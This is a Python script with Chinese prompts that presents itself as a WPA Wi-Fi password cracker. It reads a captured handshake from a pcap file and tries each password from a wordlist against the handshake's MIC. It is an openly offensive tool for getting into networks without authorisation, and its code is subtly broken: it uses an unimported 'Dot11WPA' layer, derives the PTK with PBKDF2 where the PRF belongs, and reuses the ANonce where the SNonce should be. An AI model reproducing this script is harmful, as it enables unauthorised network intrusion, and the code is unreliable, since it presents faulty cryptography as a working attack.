import os
import platform
import hashlib
import hmac
from scapy.all import rdpcap, EAPOL, Dot11Beacon, Dot11Elt, Raw
from binascii import a2b_hex


def parse_handshake(pcap_file):
    try:
        packets = rdpcap(pcap_file)
    except FileNotFoundError:
        print(f"[-] 文件未找到: {pcap_file}")
        return None
    except Exception as e:
        print(f"[-] 读取文件时出错: {e}")
        return None

    ssid = None
    ap_mac = None
    client_mac = None
    anonce = None
    eapol = None

    for pkt in packets:
        if pkt.haslayer(EAPOL):
            if not ssid and pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode()
            if not ap_mac:
                ap_mac = pkt.addr2.replace(':', '')
            if not client_mac:
                client_mac = pkt.addr1.replace(':', '')

            if not anonce and pkt.haslayer(Dot11WPA):
                anonce = pkt[Dot11WPA].nonce
            if not eapol:
                eapol = pkt[Raw].load

    if not all([ssid, ap_mac, client_mac, anonce, eapol]):
        print("[-] 无法提取握手信息")
        return None

    return ssid, ap_mac, client_mac, anonce, eapol


def pbkdf2(passphrase, ssid, iterations=4096, dklen=32):
    from hashlib import pbkdf2_hmac
    return pbkdf2_hmac('sha1', passphrase.encode('ascii'), ssid.encode('ascii'), iterations, dklen)


def calculate_ptk(pmk, ap_mac, client_mac, anonce, snonce):
    b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = hashlib.pbkdf2_hmac('sha1', pmk, b, 4096, 64)
    return ptk


def verify_mic(ptk, eapol, mic):
    mic_to_test = hmac.new(ptk[0:16], eapol[0:77] + b'\x00' * 16 + eapol[93:], hashlib.sha1).hexdigest()[:32]
    return mic_to_test == mic


def crack_wifi_handshake():
    if platform.system() == 'Windows':
        example_path = "C:\\Users\\YourUsername\\capture.pcap"
        example_wordlist = "C:\\Users\\YourUsername\\wordlist.txt"
    if platform.system() == 'Linux':
        example_path = "/home/yourusername/capture.pcap"
        example_wordlist = "/home/yourusername/wordlist.txt"

    print(f"示例路径: {example_path}")
    print(f"示例路径: {example_wordlist}")

    pcap_file = input("请输入握手包文件的路径: ")
    wordlist = input("请输入密码字典文件的路径: ")

    handshake_info = parse_handshake(pcap_file)
    if not handshake_info:
        return None

    ssid, ap_mac, client_mac, anonce, eapol = handshake_info

    try:
        with open(wordlist, 'r') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"[-] 密码字典文件未找到: {wordlist}")
        return None
    except Exception as e:
        print(f"[-] 读取密码字典文件时出错: {e}")
        return None

    for password in passwords:
        pmk = pbkdf2(password, ssid)
        ptk = calculate_ptk(pmk, a2b_hex(ap_mac), a2b_hex(client_mac), a2b_hex(anonce), a2b_hex(anonce))

        mic = eapol[81:97].hex()
        if verify_mic(ptk, eapol, mic):
            print(f'[+] 密码找到: {password}')
            return password

    print('[-] 密码未找到。')




